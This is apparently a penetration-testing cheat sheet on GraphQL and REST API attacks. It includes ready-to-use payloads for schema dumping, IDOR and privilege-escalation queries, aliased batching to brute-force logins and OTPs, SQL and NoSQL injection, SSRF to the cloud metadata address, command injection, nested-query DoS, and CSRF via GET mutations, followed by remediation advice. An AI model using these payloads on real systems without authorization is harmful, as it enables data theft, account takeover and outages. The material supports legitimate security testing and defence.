# GraphQL & API Attacks

GraphQL exposes a single endpoint with a typed schema and client-defined queries. Its flexibility creates a distinct attack surface: schema disclosure via introspection, broken object/field authorization, batching-based brute force & rate-limit bypass, injection through resolvers, and DoS via deeply nested queries. This file also covers general REST/API testing (BOLA/BFLA, mass assignment) — see also access-control/idor-broken-access-control.md.

---

## Discovery & recon

```text
Common endpoints: /graphql  /graphql/console  /api/graphql  /v1/graphql  /v2/graphql
  /graphiql  /playground  /altair  /index.php?graphql  /graphql.php  /query  /gql
```

```bash
# Find the endpoint
ffuf -u https://TARGET/FUZZ -w graphql-endpoints.txt -mc 200
nuclei -u https://TARGET -tags graphql
# Detect engine + suggestions (graphw00f)
python3 graphw00f.py -d -f -t https://TARGET/graphql
```

---

## Introspection (full schema dump)

```bash
# Quick check
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

Full introspection query (truncated form):

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name } mutationType { name } subscriptionType { name }
    types { ...FullType }
    directives { name args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name fields(includeDeprecated:true){ name args{...InputValue} type{...TypeRef} }
  inputFields{...InputValue} interfaces{...TypeRef} enumValues(includeDeprecated:true){name}
  possibleTypes{...TypeRef}
}
fragment InputValue on __InputValue { name type{...TypeRef} defaultValue }
fragment TypeRef on __Type { kind name ofType{kind name ofType{kind name}} }
```

```bash
# InQL / clairvoyance
inql -t https://TARGET/graphql                       # dump schema, generate queries
# Introspection disabled? recover schema via field-suggestion brute force:
clairvoyance -o schema.json https://TARGET/graphql -w wordlist.txt
```

**Field suggestions** ("Did you mean `email`?") leak schema even when introspection is off — Clairvoyance weaponizes this.

---

## Authorization attacks (most common, highest value)

GraphQL enforces no authz by default — each resolver must check it. Test every field/mutation as low-priv/no-auth.

```graphql
# BOLA / IDOR — read other users' objects by id
query { user(id:"1025"){ id email phone ssn paymentMethods{ number } } }

# BFLA — call admin-only mutation as a normal user
mutation { deleteUser(id:"42"){ success } }
mutation { updateUserRole(id:"me", role:"ADMIN"){ id role } }

# Field-level authz gap — sensitive field returned where the REST view hid it
query { me { id email passwordHash apiKeys internalNotes } }

# Nested authz bypass — reach a protected type through an unprotected edge
query { product(id:1){ owner { email orders { creditCard } } } }
```

Replay each query with no token / a low-priv token (Burp Autorize works on GraphQL too).

---

## Batching attacks (rate-limit & 2FA/brute-force bypass)

Send many operations in one HTTP request → defeats per-request rate limiting.

### Array batching

```json
[
  {"query":"mutation{login(user:\"admin\",pass:\"a\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"b\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"c\"){token}}"}
]
```

### Aliased batching (single operation, many calls)

```graphql
mutation {
  a: login(user:"admin", pass:"0000"){ token }
  b: login(user:"admin", pass:"0001"){ token }
  c: login(user:"admin", pass:"0002"){ token }
  # ... thousands of aliases -> brute 2FA/OTP/coupon/password in one request
}
```

Great for brute-forcing OTPs (10^4 / 10^6 space) and coupon/gift-card codes past rate limits.

---

## Injection through resolvers

GraphQL is a transport; the backend resolver may be vulnerable to everything else:

```graphql
# SQLi in an argument
query { user(id:"1 OR 1=1"){ name } }
query { products(filter:"x' UNION SELECT username,password FROM users-- -"){ name } }

# NoSQLi
query { login(filter:"{\"$ne\":null}"){ token } }

# SSRF via a URL-taking field
mutation { importFromUrl(url:"http://169.254.169.254/latest/meta-data/"){ status } }

# Command injection / path traversal in file/format args
query { export(format:"pdf; id"){ url } }
```

Test each argument with the relevant injection payloads (see sqli/, nosqli/, ssrf/, command-injection/).

---

## Denial of Service

```graphql
# Deeply nested / circular relationships -> exponential resolution
query { posts { author { posts { author { posts { author { id }}}}}}}
# Alias amplification
query { a:expensive b:expensive c:expensive ... }
# Field duplication / huge list args
```

Report responsibly — confirm cost, don't actually take production down.

---

## CSRF & method abuse on GraphQL

- If the endpoint accepts `GET` with the query in the URL, or `POST` with `Content-Type: application/x-www-form-urlencoded` / `text/plain`, it's CSRF-able (no preflight). Send mutations cross-site.

```
GET /graphql?query=mutation{deleteAccount}
POST /graphql  (Content-Type: application/x-www-form-urlencoded)  query=mutation{...}
```

---

## General REST/API testing checklist

```text
- BOLA: swap object ids across accounts (two-actor replay)
- BFLA: call admin functions as user; try undocumented methods (PUT/PATCH/DELETE)
- Mass assignment: add fields {"role":"admin","verified":true}
- Excessive data exposure: API returns more than UI shows (mobile app, /v1 vs /v2)
- Improper inventory: old/staging/debug API versions, /swagger.json, /openapi.json
- Auth: API keys in URL, JWT issues (see jwt-attacks.md), missing rate limits
- Discover spec: /swagger-ui, /api-docs, /openapi.json, /v3/api-docs, .well-known
```

```bash
# Pull and exercise an OpenAPI spec
curl https://TARGET/openapi.json -o api.json
# import to Burp/Postman, fuzz every method/param
```

---

## Tooling

| Tool | Use |
|------|-----|
| **InQL** (Burp ext) | Schema dump, query generation, batching |
| **graphw00f** | Fingerprint the GraphQL engine |
| **clairvoyance** | Recover schema with introspection disabled |
| **GraphQLmap** | Interactive exploitation, dump, injection |
| **GraphQL Raider / Voyager** | Burp query editing / schema visualization |
| **Autorize / Auth Analyzer** | GraphQL authz testing |
| **batchql / CrackQL** | Batching brute force / DoS checks |

```bash
graphqlmap -u https://TARGET/graphql --method POST
python3 CrackQL.py -t https://TARGET/graphql -q login.graphql -i creds.csv
```

---

## Remediation

- Disable introspection and field suggestions in production.
- Enforce authorization **in every resolver** (object- and field-level); deny by default.
- Disable/limit query batching; apply cost analysis, depth & complexity limits, and timeouts.
- Rate-limit by operation cost, not request count (defeats aliasing/batching).
- Validate & parameterize all resolver inputs; treat them like any user input.
- Require `application/json` + CSRF protection; reject `GET` mutations.

---

## Cheatsheet

```text
# Endpoints
/graphql /graphiql /playground /v1/graphql /api/graphql
# Introspection check
{"query":"{__schema{types{name}}}"}
# Recover schema (introspection off)
clairvoyance -o s.json https://T/graphql -w wl.txt
# BOLA / BFLA
query{user(id:"OTHER"){email}}   mutation{updateUserRole(id:"me",role:"ADMIN"){id}}
# Aliased batching brute force
mutation{a:login(p:"0000"){t} b:login(p:"0001"){t} ...}
# Injection
query{user(id:"1 OR 1=1"){name}}   mutation{importFromUrl(url:"http://169.254.169.254/")}
# CSRF
GET /graphql?query=mutation{deleteAccount}
```

---

## References

- PortSwigger — GraphQL API vulnerabilities: https://portswigger.net/web-security/graphql
- PayloadsAllTheThings — GraphQL: https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/
- HackTricks — GraphQL: https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- InQL: https://github.com/doyensec/inql | clairvoyance: https://github.com/nikitastupin/clairvoyance
- graphw00f: https://github.com/dolevf/graphw00f | GraphQLmap: https://github.com/swisskyrepo/GraphQLmap
- AFINE — GraphQL security from a pentester's perspective: https://afine.com/graphql-security-from-a-pentesters-perspective
